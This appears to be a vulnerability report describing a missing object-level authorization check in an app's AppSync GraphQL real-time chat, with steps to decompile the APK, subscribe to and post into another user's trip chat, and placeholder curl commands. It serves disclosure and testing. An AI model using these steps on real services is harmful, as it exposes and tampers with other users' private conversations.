## Use case

The vulnerability allowed an attacker to subscribe to and read another user's trip chat and inject messages into it by exploiting a lack of object-level authorization in a real-time API. This could lead to unauthorized access to personal information shared in the chat.

## Steps to test

1. Step 1: Decompile the APK to recover the AppSync GraphQL endpoint and real-time WebSocket endpoint.
2. Step 2: Complete the app’s OAuth/OIDC federated sign-in to obtain an authentication token.
3. Step 3: Open the real-time WebSocket to the AppSync real-time endpoint using the obtained token.
4. Step 4: Subscribe to the chat-inbox subscription with a tripId that is NOT yours and observe the server accept the subscription.
5. Step 5: Publish a message to the same non-owner tripId and verify that your subscription receives the published message.

## Commands

```text
curl -X POST https://example.com/graphql -H 'Authorization: Bearer <your_id_token>' -d '{"query":"mutation { sendMessage(tripId: \"<target_tripId>\", message: \"Hello\") }"}'
curl -X GET https://example.com/graphql -H 'Authorization: Bearer <your_id_token>' -d '{"query":"subscription { messageInbox(tripId: \"<target_tripId>\") }"}'
updateBroadcastMessage    -> "Not Authorized to access updateBroadcastMessage on type Mutation"
refreshUserTripLocation   -> "Not Authorized to access refreshUserTripLocation on type Subscription"
```
